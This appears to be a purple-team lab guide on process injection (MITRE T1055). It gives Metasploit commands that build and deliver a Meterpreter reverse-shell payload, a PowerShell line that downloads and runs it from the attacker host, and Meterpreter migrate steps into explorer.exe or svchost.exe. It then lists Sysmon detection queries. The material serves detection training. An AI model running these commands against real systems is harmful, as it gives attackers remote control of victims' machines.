# 01 - Process Injection (T1055)

## Description

Process injection is a technique where an attacker inserts malicious code into the memory space of a legitimate running process. This allows the attacker to execute code under the guise of a trusted process (e.g., `explorer.exe`, `svchost.exe`), evading process-based security controls.

**MITRE ATT&CK:** [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/)

## Sub-techniques Covered

- T1055.001 — DLL Injection
- T1055.002 — Portable Executable Injection
- T1055.012 — Process Hollowing

## Prerequisites

- Kali Linux attacker machine set up ([../lab-setup/kali-linux-main](../../lab-setup/kali-linux-main/README.md))
- Windows 10 or Windows Server 2022 victim with Sysmon installed
- Metasploit Framework installed on Kali

## Steps to Reproduce

### Step 1: Generate a Meterpreter Payload

On Kali Linux:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.10.10 \
    LPORT=4444 \
    -f exe \
    -o /tmp/payload.exe
```

### Step 2: Start Metasploit Listener

```bash
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.10.10
msf6 > set LPORT 4444
msf6 > run
```

### Step 3: Deliver Payload to Victim

Transfer `payload.exe` to the Windows victim (e.g., via SMB share, HTTP server):

```bash
# On Kali: serve file via HTTP
python3 -m http.server 8080

# On Windows victim (PowerShell):
Invoke-WebRequest -Uri "http://192.168.10.10:8080/payload.exe" -OutFile "C:\Users\Public\payload.exe"
C:\Users\Public\payload.exe
```

### Step 4: Inject into a Remote Process

Once you have a Meterpreter session:

```
meterpreter > ps                          # list running processes
meterpreter > migrate 1234               # inject into PID 1234 (e.g., explorer.exe)
meterpreter > getpid                     # confirm new PID
```

Alternatively, use the `migrate` command to inject into `svchost.exe`:

```
meterpreter > pgrep svchost
meterpreter > migrate <svchost-PID>
```

## Expected Network Traffic

- Outbound TCP connection from victim to `192.168.10.10:4444`
- Connection from a process that doesn't normally make outbound connections (e.g., `svchost.exe`)
- Periodic beacon traffic (Meterpreter keepalive)

## Expected Log Entries

### Sysmon Event ID 8 — CreateRemoteThread

```xml
EventID: 8
SourceImage: C:\Users\Public\payload.exe
TargetImage: C:\Windows\explorer.exe
TargetProcessId: 1234
```

### Sysmon Event ID 10 — ProcessAccess

```xml
EventID: 10
SourceImage: C:\Users\Public\payload.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010
```

### Sysmon Event ID 3 — Network Connection

```xml
EventID: 3
Image: C:\Windows\explorer.exe
DestinationIp: 192.168.10.10
DestinationPort: 4444
```

## Detection Opportunities

| Indicator | Log Source | Query |
|-----------|-----------|-------|
| Remote thread created in unusual process | Sysmon Event 8 | `EventID=8 TargetImage=explorer.exe SourceImage!=*` |
| Process accessing LSASS memory | Sysmon Event 10 | `EventID=10 TargetImage=lsass.exe` |
| Outbound connection from system process | Sysmon Event 3 | `EventID=3 Image=*\explorer.exe DestinationPort=4444` |

See [../../detections/sysmon-rules/README.md](../../detections/sysmon-rules/README.md) and [../../detections/splunk-queries/README.md](../../detections/splunk-queries/README.md) for specific detection rules.
